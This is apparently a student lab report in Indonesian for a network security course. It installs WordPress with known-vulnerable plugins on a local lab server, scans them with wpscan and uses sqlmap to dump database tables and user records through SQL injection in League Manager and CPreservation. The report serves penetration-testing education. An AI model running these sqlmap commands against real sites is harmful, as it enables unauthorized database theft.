# Tugas 2 Perancangan Sistem Keamanan Jaringan 2017

### Anggota Kelompok

|Nama      |NRP    |
|---|---|
Rian Danis  | 5114100084
Naufan Arifie | 5114100136
Dimas Hirda P | 5114100147

### Dasar Teori
#### 1. OS
  * Ubuntu 16.04
  Ubuntu (/[unsupported input]ʊˈbʊntuː/) merupakan salah satu distribusi Linux yang berbasiskan Debian dan didistribusikan sebagai        perangkat lunak bebas. Nama Ubuntu berasal dari filosofi dari Afrika Selatan yang berarti "kemanusiaan kepada sesama"[9]. Ubuntu dirancang untuk kepentingan penggunaan pribadi, namun versi server Ubuntu juga tersedia, dan telah dipakai secara luas.
    (sumber: https://id.wikipedia.org/wiki/Ubuntu)
  * Ubuntu Server
  adalah suatu desain ubuntu yang digunakan untuk diinstall di lingkungan enterprise atau perusahaan untuk keperluan seperti web server ataupun router, secara default versi server ini tidak menyertakan antarmuka GUI, yang ada hanya shell alias Command line,aplikasi bawaan dari ubuntu server sekedar info buat anda berupa aplikasi serveri webserver, DNS server, DHCP server, firewall, openSSH, dan applikasi yang berhubungan dengan server, teknologi yang dibenamkan diserver juga umumnya hanya dipakai oleh orang yang benar benar advanced di Linux. (sumber: https://etix.wordpress.com/2010/01/28/perbedaan-ubuntu-server-dan-desktop/)

#### 2. Tools yang digunakan
 Wordpress Plugin
 * Video Player versi 1.5.16
 * League Manager versi 3.9.11
 
 Tools
 * SQL Map
 * Wpscan
 
### Installasi Wordpress
 1. Pastikan LAMP stack sudah terinstall, jika belum ikuti langkah berikut
 2. 
    ```bash
    sudo apt-get update && apt-get upgrade
    sudo apt-get install lamp-server^
    ```
 3. Install PHP modules
    ```bash
    sudo apt-get install php7.0 php7.0-mysql libapache2-mod-php7.0 php7.0-cli php7.0-cgi php7.0-gd 
    ```
 4. Membuat Database untuk Wordpress
    ```sql
    CREATE DATABASE wpdb;
    GRANT ALL PRIVILEGES ON wpdb.* TO 'admin'@'localhost' IDENTIFIED BY 'tes';
    FLUSH PRIVILEGES;
    EXIT;
    ```
 5. Download , install dan setting Wordpress
    ```bash
    wget -c http://wordpress.org/latest.tar.gz
    tar -xzvf latest.tar.gz
    sudo chown -R www-data:www-data /var/www/html/wordpress
    sudo chmod -R 755 /var/www/html/wordpress
    cd /var/www/html/wordpress
    sudo mv wp-config-sample.php wp-config.php
    ```
    Setting konfigurasi untuk mysql
    ```bash
    sudo nano wp-config.php
    ```
    Restart Apache dan Mysql
    ```bash
    sudo systemctl restart apache2.service
    sudo systemctl restart mysql.service
    ```
 6. Buka Halaman wordpress anda muncul tampilan seperti ini jika instalasi berhasil
    ![alt text](https://github.com/dimashirda/PKSJ-1/blob/master/PKSJ/Tugas%202/install1.png)
 7. Isi kolom yang diperlukan
    ![alt text](https://github.com/dimashirda/PKSJ-1/blob/master/PKSJ/Tugas%202/install2.png)
    
    ![alt text](https://github.com/dimashirda/PKSJ-1/blob/master/PKSJ/Tugas%202/install3.png)
    
 8. Login dengan akun yang sudah dibuat
    ![alt text](https://github.com/dimashirda/PKSJ-1/blob/master/PKSJ/Tugas%202/login1.png)
    
### Instalasi Plugin
 1. Unduh plugin Wordpress Video Player v.1.5.16
 2. Login ke wordpress, pilih add new pada navigasi plugin
    ![alt text](https://github.com/dimashirda/PKSJ-1/blob/master/PKSJ/Tugas%202/add1.png)
 3. Unggah file yang telah diunduh dan pilih install now
    ![alt text](https://github.com/dimashirda/PKSJ-1/blob/master/PKSJ/Tugas%202/add2.png)
    ![alt text](https://github.com/dimashirda/PKSJ-1/blob/master/PKSJ/Tugas%202/add3.png)
    ![alt text](https://github.com/dimashirda/PKSJ-1/blob/master/PKSJ/Tugas%202/add4.png)
 4. Pilih activate plugin
 
### SQLAnalisis dengan wpscan
1. memindai vulnerabilities dari plugin yang telah diinstall menggunakan wpscan
  ```bash
  wpscan -u 192.168.1.15/wordpress --enumerate vp
  ```
   ![alt text](https://github.com/dimashirda/PKSJ-1/blob/master/PKSJ/Tugas%202/wpscan1.png)
2. tunggu hingga proses pemindaian vulnerabilities wpscan selesai
   ![alt text](https://github.com/dimashirda/PKSJ-1/blob/master/PKSJ/Tugas%202/wpscan2.png)
 
### SQLInjection dengan sqlmap
1. Menggunakan Sql Map untuk melakukan sql injection terhadap leaguemanager untuk menggambil semua tables yang ada.

```bash
sqlmap -u "http://10.151.36.5/html/2016/10/12/match/?match=1" --dbms mysql --level 5 --risk 3 --tables
```
  ![alt text](https://github.com/dimashirda/PKSJ-1/blob/master/PKSJ/Tugas%202/sqlmap1.png)

Hasil Uji dengan sqlmap dengan command:

 ![alt text](https://github.com/dimashirda/PKSJ-1/blob/master/PKSJ/Tugas%202/sqlmap2.png)
 ![alt text](https://github.com/dimashirda/PKSJ-1/blob/master/PKSJ/Tugas%202/sqlmap3.png)
 ![alt text](https://github.com/dimashirda/PKSJ-1/blob/master/PKSJ/Tugas%202/sqlmap4.png)
 
2. Menggunakan Sql Map untuk mengambil tabel user leaguemanager

 ![alt text](https://github.com/dimashirda/PKSJ-1/blob/master/PKSJ/Tugas%202/sqlmap4.5.png)
 
 hasilnya:
 ![alt text](https://github.com/dimashirda/PKSJ-1/blob/master/PKSJ/Tugas%202/sqlmap5.png)
 
3. Menggunakan Sql Map untuk melakukan sql injection terhadap CPreservation.

Lakukan perintah seperti dibawah
![alt text](https://github.com/dimashirda/PKSJ-1/blob/master/PKSJ/Tugas%202/reservation0.png)

Maka, terlihat parameter yang vulnerable

![alt text](https://github.com/dimashirda/PKSJ-1/blob/master/PKSJ/Tugas%202/reservation.png)

4. Menggunakan Sql Map untuk mengambil tabel user CPreservation

Lakukan perintah seperti dibawah
![alt text](https://github.com/dimashirda/PKSJ-1/blob/master/PKSJ/Tugas%202/reservation1.png)

 
 hasilnya:
 ![alt text](https://github.com/dimashirda/PKSJ-1/blob/master/PKSJ/Tugas%202/reservation2.png)
